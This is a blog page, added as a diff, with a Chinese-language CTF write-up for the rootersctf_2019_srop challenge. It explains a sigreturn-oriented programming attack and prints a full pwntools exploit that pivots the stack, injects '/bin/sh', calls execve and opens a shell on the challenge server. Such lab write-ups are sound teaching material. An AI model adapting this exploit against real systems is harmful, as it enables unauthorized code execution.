@@ -1,0 +1,61 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-rootersctf_2019_srop-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入&#34;/bin/sh\x00&#34;和执行execve的"><meta property="og:image" content><meta property="og:title" content="BUU-rootersctf_2019_srop-WP"><meta property="og:description" content="只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入&#34;/bin/sh\x00&#34;和执行execve的"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-rootersctf_2019_srop-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-28T18:17:00+00:00"><meta property="article:modified_time" content="2020-11-28T18:17:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-rootersctf_2019_srop-WP"><meta name=twitter:description content="只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入&#34;/bin/sh\x00&#34;和执行execve的"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-rootersctf_2019_srop-WP</h1><div class=meta>Posted on Nov 28, 2020</div></div><section class=body><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201128160138.png alt class=wp-image-675></figure></div><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201128160155.png alt class=wp-image-676></figure></div><p>只开了NX，只存在syscall的gadgets，基本上就是srop了。无非就是做两件事，注入"/bin/sh\x00"和执行execve的系统调用，我们发现在syscall前面存在<code>pop rax</code>所以execve是容易实现的，然后就是注入"/bin/sh\x00"</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201128160451.png alt class=wp-image-677></figure></div><p>程序有一段大小足够的data段，所有我们可以考虑通过设置rsi至此来输入"/bin/sh"然后执行execve系统调用。</p><p>第一步先布置fake signal frame，之前rsp先被减了0x40，这里rsi=rsp+0x40+buf，所以偏移仍然是-buf。又在retn之前有一个leave，所以还要填8个字节的垃圾数据；同时布置fake signal frame还要多指定一个rbp，因为leave的时候等价于<code>mov rsp,rbp pop rbp</code>。</p><pre class=wp-block-code><code>sigframe = SigreturnFrame()                                          
+sigframe.rax = constants.SYS_read                                    
+sigframe.rdi = 0            #fd                                      
+sigframe.rdx = 0x300       #conunt                                   
+sigframe.rsi = data_seg_addr#buf                                     
+sigframe.rsp = data_seg_addr                                         
+sigframe.rbp = data_seg_addr                                         
+sigframe.rip = syscall_leave_ret                                     
+                                                                     
+                                                                     
+payload = 'a'*0x80 + 'b'*8 + p64(pop_rax_syscall_leave_ret) + p64(15)  
+payload += str(sigframe)                                             
+sh.sendlineafter("Hey, can i get some feedback for the CTF?\n",payload)
+sleep(0.3)                                                             </code></pre><p>这样就完成了栈迁移，然后我们只要再布置execve的signal frame并注入"/bin/sh\x00"就可以获得shell了。</p><p>最后的exp</p><pre class=wp-block-code><code>from pwn import *                                                                          
+                                                                                           
+context(log_level = 'debug',arch = 'amd64',os = 'linux')                                   
+                                                                                           
+pop_rax_syscall_leave_ret = 0x401032                                                       
+syscall_leave_ret = 0x401033                                                               
+read_syscall_addr = 0x401021                                                               
+data_seg_addr = 0x402000                                                                   
+                                                                                           
+#sh = process("./rootersctf_2019_srop")                                                    
+sh = remote("node3.buuoj.cn","26669")                                                      
+                                                                                           
+sigframe = SigreturnFrame()                                                                
+sigframe.rax = constants.SYS_read                                                          
+sigframe.rdi = 0            #fd                                                            
+sigframe.rdx = 0x300       #conunt                                                         
+sigframe.rsi = data_seg_addr#buf                                                           
+sigframe.rsp = data_seg_addr                                                               
+sigframe.rbp = data_seg_addr                                                               
+sigframe.rip = syscall_leave_ret                                                           
+                                                                                           
+                                                                                           
+payload = 'a'*0x80 + 'b'*8 + p64(pop_rax_syscall_leave_ret) + p64(15)                      
+payload += str(sigframe)                                                                   
+sh.sendlineafter("Hey, can i get some feedback for the CTF?\n",payload)                    
+sleep(0.3)                                                                                 
+                                                                                           
+                                                                                           
+sigframe = SigreturnFrame()                                                                
+sigframe.rax = constants.SYS_execve                                                        
+sigframe.rdi = data_seg_addr + 0x150                                                       
+sigframe.rip = syscall_leave_ret                                                           
+sigframe.rsp = data_seg_addr + 24                                                          
+sigframe.rsi = 0                                                                           
+sigframe.rdx = 0                                                                           
+                                                                                           
+payload = ('b'*8 + p64(pop_rax_syscall_leave_ret) + p64(15) + str(sigframe)).ljust(0x150,'a')
+payload += "/bin/sh\x00"                                                                   
+sh.sendline(payload)                                                                       
+                                                                                           
+sh.interactive()                                                                             </code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/srop>srop</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
